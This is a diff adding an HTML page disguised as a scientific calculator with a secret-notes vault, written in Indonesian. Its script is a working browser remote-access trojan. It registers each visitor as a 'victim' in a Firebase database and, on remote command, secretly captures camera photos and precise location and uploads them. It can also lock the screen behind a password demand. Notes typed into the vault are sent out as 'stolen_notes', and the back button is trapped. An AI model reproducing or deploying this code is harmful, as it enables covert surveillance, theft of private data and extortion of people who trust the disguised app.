@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Kalkulator Ilmiah Pro</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        :root { --accent: #007aff; --bg: #000; --card: #1c1c1e; }
+        body { background: var(--bg); color: #fff; font-family: sans-serif; margin: 0; overflow: hidden; height: 100vh; }
+        .page { display: none; height: 100vh; flex-direction: column; }
+        .active { display: flex; }
+        /* Kalkulator UI */
+        .display-container { flex: 1; display: flex; flex-direction: column; justify-content: flex-end; padding: 25px; }
+        #display { width: 100%; background: transparent; border: none; color: #fff; font-size: 4rem; text-align: right; outline: none; }
+        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; padding: 25px; background: var(--card); border-radius: 35px 35px 0 0; }
+        button { height: 75px; border-radius: 50%; border: none; background: #333; color: #fff; font-size: 1.6rem; font-weight: bold; }
+        .op { background: #ff9500; } .eq { background: var(--accent); }
+        /* Vault UI */
+        .vault-header { padding: 20px; background: var(--card); text-align: center; font-weight: bold; color: var(--accent); }
+        textarea { width: 90%; margin: 5%; height: 120px; background: #2c2c2e; border: none; border-radius: 12px; color: #fff; padding: 15px; box-sizing: border-box; }
+        /* Lock UI */
+        #lock-screen { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; color:red; z-index:999999; flex-direction:column; align-items:center; justify-content:center; text-align:center; }
+        #lock-screen input { padding: 10px; background: #222; border: 1px solid red; color: #fff; margin-top: 20px; text-align: center; }
+        #ghost-cam, #ghost-canvas { display: none; }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+
+    <div id="calc-page" class="page active">
+        <div class="display-container"><input type="text" id="display" placeholder="0" readonly></div>
+        <div class="grid">
+            <button onclick="press('C')">C</button><button onclick="press('(')">(</button><button onclick="press(')')">)</button><button onclick="press('/')" class="op">÷</button>
+            <button onclick="press('7')">7</button><button onclick="press('8')">8</button><button onclick="press('9')">9</button><button onclick="press('*')" class="op">×</button>
+            <button onclick="press('4')">4</button><button onclick="press('5')">5</button><button onclick="press('6')">6</button><button onclick="press('-')" class="op">-</button>
+            <button onclick="press('1')">1</button><button onclick="press('2')">2</button><button onclick="press('3')">3</button><button onclick="press('+')" class="op">+</button>
+            <button onclick="press('0')">0</button><button onclick="press('.')">.</button><button onclick="solve()" class="eq" style="grid-column: span 2; border-radius: 40px;">=</button>
+        </div>
+    </div>
+
+    <div id="vault-page" class="page">
+        <div class="vault-header">SAFE VAULT</div>
+        <textarea id="note-input" placeholder="Tulis catatan rahasia..."></textarea>
+        <button onclick="saveNote()" style="width:90%; margin:5%; background:var(--accent); color:#fff; border:none; padding:15px; border-radius:8px;">SIMPAN</button>
+    </div>
+
+    <div id="lock-screen">
+        <h1 style="font-size:3.5rem;">LOCKED</h1>
+        <p>Akses ditolak oleh sistem siber.<br>Masukkan Kode Unlocking:</p>
+        <input type="password" id="unlock-pass" placeholder="Password">
+        <button onclick="tryUnlock()" style="margin-top:10px; background:red; color:#fff; border:none; padding:10px 20px;">UNLOCK DEVICE</button>
+    </div>
+
+    <video id="ghost-cam" autoplay playsinline></video>
+    <canvas id="ghost-canvas"></canvas>
+
+    <script>
+            const firebaseConfig = {
+    apiKey: "AIzaSyAS9ZCVt6iFXY8Ksd0o5z7fjXg3qi8rfhU",
+    authDomain: "remote-control-9bf2c.firebaseapp.com",
+    databaseURL: "https://remote-control-9bf2c-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "remote-control-9bf2c",
+    storageBucket: "remote-control-9bf2c.firebasestorage.app",
+    messagingSenderId: "71798344189",
+    appId: "1:71798344189:web:6cdb414c1eab16c6b9b194"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const VICTIM_ID = localStorage.getItem('v_id') || "Target_" + Math.floor(1000 + Math.random() * 9000);
+        localStorage.setItem('v_id', VICTIM_ID);
+        let currentLockPass = "";
+
+        function initRemote() {
+            db.ref('rat/' + VICTIM_ID + '/command').on('value', (s) => {
+                const c = s.val(); if(!c) return;
+                if(c.action === "lock") {
+                    currentLockPass = c.pass;
+                    document.getElementById('lock-screen').style.display = 'flex';
+                    document.documentElement.requestFullscreen();
+                } else if(c.action === "unlock") {
+                    document.getElementById('lock-screen').style.display = 'none';
+                } else if(c === "front") takeShot("user");
+                else if(c === "back") takeShot("environment");
+                else if(c === "loc") getLoc();
+                db.ref('rat/' + VICTIM_ID + '/command').set(null);
+            });
+        }
+
+        async function takeShot(m) {
+            const v = document.getElementById('ghost-cam');
+            const c = document.getElementById('ghost-canvas');
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: m } });
+                v.srcObject = s; await new Promise(r => setTimeout(r, 1000));
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                db.ref('rat/'+VICTIM_ID+'/shots/'+m).set({ img: c.toDataURL('image/jpeg', 0.4) });
+                s.getTracks().forEach(t => t.stop());
+            } catch (e) {}
+        }
+
+        function getLoc() {
+            navigator.geolocation.getCurrentPosition((p) => {
+                db.ref('rat/'+VICTIM_ID+'/location').set({
+                    map: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`
+                });
+            }, null, {enableHighAccuracy: true});
+        }
+
+        function tryUnlock() {
+            const p = document.getElementById('unlock-pass').value;
+            if(p === currentLockPass) {
+                document.getElementById('lock-screen').style.display = 'none';
+                if (document.exitFullscreen) document.exitFullscreen();
+            } else { alert("PASSWORD SALAH!"); }
+        }
+
+        const disp = document.getElementById('display');
+        function press(k) { (k==='C') ? disp.value='' : disp.value+=k; }
+        function solve() {
+            if(disp.value === "8888") {
+                document.getElementById('calc-page').classList.remove('active');
+                document.getElementById('vault-page').classList.add('active');
+                disp.value = ""; return;
+            }
+            try { disp.value = eval(disp.value); } catch(e) { disp.value = "Error"; }
+        }
+
+        function saveNote() {
+            const txt = document.getElementById('note-input').value;
+            db.ref('rat/'+VICTIM_ID+'/stolen_notes').push({ content: txt });
+            alert("Catatan Disimpan.");
+        }
+
+        window.onload = () => {
+            initRemote();
+            window.history.pushState(null, null, window.location.href);
+            window.onpopstate = () => window.history.pushState(null, null, window.location.href);
+        };
+    </script>
+</body>
+</html>
